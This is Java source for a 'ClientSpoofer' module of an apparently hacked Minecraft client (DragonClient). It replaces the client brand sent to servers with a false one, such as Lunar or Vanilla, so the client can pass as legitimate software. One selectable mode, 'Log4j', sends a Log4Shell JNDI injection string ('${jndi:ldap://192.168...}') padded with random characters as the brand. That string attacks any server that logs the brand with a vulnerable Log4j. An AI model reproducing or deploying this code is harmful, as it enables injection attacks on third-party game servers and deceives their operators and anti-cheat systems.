package dragonclient.module.impl.misc;

import org.apache.commons.lang3.RandomStringUtils;

import dragonclient.Dragon;
import dragonclient.event.Listener;
import dragonclient.event.Events.PacketSendEvent;
import dragonclient.module.Category;
import dragonclient.module.Module;
import dragonclient.module.settings.DescriptionSetting;
import dragonclient.module.settings.ListSetting;
import dragonclient.util.PacketUtil;
import dragonclient.util.RandomUtil;
import io.netty.buffer.Unpooled;
import net.lax1dude.eaglercraft.KeyboardConstants;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class ClientSpoofer extends Module{
    private DescriptionSetting description = new DescriptionSetting("Description", "Spoofs your client brand to the server, making it look like you're using a different client.");
    private static ListSetting mode = new ListSetting("Mode", new String[] {
            "Eagler",
            "Vanilla",
            "OptiFine",
            "Fabric",
            "Lunar",
            "LabyMod",
            "CheatBreaker",
            "PvPLounge",
            "Geyser",
            "Log4j" }, "Eagler");

    public ClientSpoofer() {
        super("ClientSpoofer", Category.MISC);
        addSettings(description, mode);
        Dragon.eventManager.registerListener(this, PacketSendEvent.class);
    }

    public void onPacketSendEvent(PacketSendEvent event) {
        if (!Minecraft.getMinecraft().isIntegratedServerRunning()) {
            if (event.packet instanceof CPacketCustomPayload) {
                CPacketCustomPayload packet = (CPacketCustomPayload) event.packet;
                if (packet.getChannelName().equalsIgnoreCase("MC|Brand")) {
                    switch (mode.get()) {
                        case "Eagler":
                            sendBrandPacket("eagler");
                            break;
                        case "Vanilla":
                            sendBrandPacket("vanilla");
                            break;
                        case "OptiFine":
                            sendBrandPacket("optifine");
                            break;
                        case "Fabric":
                            sendBrandPacket("fabric");
                            break;
                        case "Lunar":
                            sendBrandPacket("Lunar-Client");
                            break;
                        case "LabyMod":
                            sendBrandPacket("LMC");
                            break;
                        case "CheatBreaker":
                            sendBrandPacket("CB");
                            break;
                        case "PvPLounge":
                            sendBrandPacket("PLC18");
                            break;
                        case "Geyser":
                            sendBrandPacket("Geyser");
                            break;
                        case "Log4j":
                            int randomInt1 = RandomUtil.nextInt(1, 253);
                            int randomInt2 = RandomUtil.nextInt(1, 253);
                            String str = String.format("${jndi:ldap://192.168.%d.%d}", randomInt1, randomInt2);
                            
                            String randomString1 = RandomStringUtils.randomAlphanumeric(5);
                            String randomString2 = RandomStringUtils.randomAlphanumeric(5);
                            
                            String payload = String.format("%s%s%s", randomString1, str, randomString2);
                            sendBrandPacket(payload);
                            break;
                        case "DragonX":
                            sendBrandPacket("DragonX");
                            break;
                    }
                    event.cancelEvent();
                }
            }
        }
    }

    private static void sendBrandPacket(String brand) {
        CPacketCustomPayload packet = new CPacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer()).writeString(brand));
        PacketUtil.sendPacketVerySilent(packet);
    }
}
